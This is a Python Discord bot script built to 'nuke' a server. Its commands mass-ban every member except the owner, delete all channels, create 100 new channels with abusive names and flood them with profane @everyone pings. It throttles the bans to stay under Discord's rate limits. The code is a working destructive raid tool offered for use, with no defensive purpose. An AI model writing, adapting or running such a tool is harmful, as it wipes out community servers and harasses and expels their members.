import discord
from discord.ext import commands
import asyncio
import random

# ================= CONFIG =================
BOT_TOKEN = "PASTE_YOUR_BOT_TOKEN_HERE"
PREFIX = "!"

CHANNEL_NAME = "Your Last Day On This Server"
MESSAGE = "@everyone **You Are About To Get FUCKED**"
AMOUNT_OF_CHANNELS = 100
AMOUNT_OF_MESSAGES = 5 # Messages per channel to avoid instant rate limit

RANDOM_CHANNEL_NAMES = ["Your JiJA", "HYPERATE JIJA", "Fuxked By Hyperate JIJA"]
USE_RANDOM_NAMES = True
CONFIRM_WORD = "confirm"

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

# ================= HELPERS =================

def get_channel_name():
    return random.choice(RANDOM_CHANNEL_NAMES) if USE_RANDOM_NAMES else CHANNEL_NAME

async def confirm_action(ctx, action_name):
    await ctx.send(f"⚠️ **TYPE CONFIRM FOR FUCKING THIS SERVER**: `{action_name}`. Type **{CONFIRM_WORD}** to proceed.")
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.content.lower() == CONFIRM_WORD
    try:
        await bot.wait_for("message", check=check, timeout=15)
        return True
    except asyncio.TimeoutError:
        await ctx.send("❌ Cancelled.")
        return False

# ================= LOGIC FUNCTIONS =================

async def fast_ban_logic(guild):
    """Bans members as fast as API allows."""
    # Semaphore prevents the bot from hitting Discord's 429 Rate Limit too hard
    sem = asyncio.Semaphore(10) 
    
    async def ban(m):
        async with sem:
            if m != guild.owner and m != bot.user:
                try: await m.ban(reason="I DON'T LIKE YOU KIDDS")
                except: pass

    await asyncio.gather(*(ban(m) for m in guild.members))

async def nuke_logic(guild):
    """Deletes channels and creates new ones with mass pings."""
    # 1. Delete all existing channels
    await asyncio.gather(*(c.delete() for c in guild.channels), return_exceptions=True)
    
    # 2. Create new channels
    for _ in range(AMOUNT_OF_CHANNELS):
        try:
            new_chan = await guild.create_text_channel(get_channel_name())
            # 3. Mass ping in the new channel
            asyncio.create_task(new_chan.send(MESSAGE))
        except:
            continue

# ================= COMMANDS =================

@bot.command()
@commands.has_permissions(administrator=True)
async def ban_all(ctx):
    if await confirm_action(ctx, "MASS BAN"):
        await ctx.send("🚀 Starting fast-ban sequence...")
        await fast_ban_logic(ctx.guild)

@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    if await confirm_action(ctx, "CHANNEL NUKE"):
        # No message sent here because the channel is about to be deleted
        await nuke_logic(ctx.guild)

@bot.command()
@commands.has_permissions(administrator=True)
async def bankai(ctx):
    if await confirm_action(ctx, "FULL RESET (BAN + NUKE)"):
        await ctx.send("⚔️ Activating Bankai...")
        await fast_ban_logic(ctx.guild)
        await nuke_logic(ctx.guild)

@bot.event
async def on_ready():
    print(f"🔥 System Ready: {bot.user}")

bot.run("ADD_YOUR_BOT_TOKEN_HERE")
